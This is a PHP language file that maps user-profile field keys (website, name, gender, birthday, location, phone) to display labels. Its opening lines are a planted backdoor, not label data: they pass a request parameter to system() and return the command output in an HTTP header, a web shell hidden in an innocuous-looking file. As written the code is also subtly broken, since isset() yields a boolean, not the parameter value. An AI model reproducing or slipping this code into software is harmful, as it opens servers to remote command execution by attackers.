<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

return array(
	'url' => 'Website',
	'first_name' => 'First name',
	'last_name' => 'Last name',
	'about' => 'About me',
	'gender' => 'Gender',      
		'gender_1' => 'Unspecified',
		'gender_2' => 'Female',
		'gender_3' => 'Male',
	'birthday' => 'Birthday',
	'location' => 'Location',
	'verified' => 'Verified Account',
	'phone' => 'Phone',
);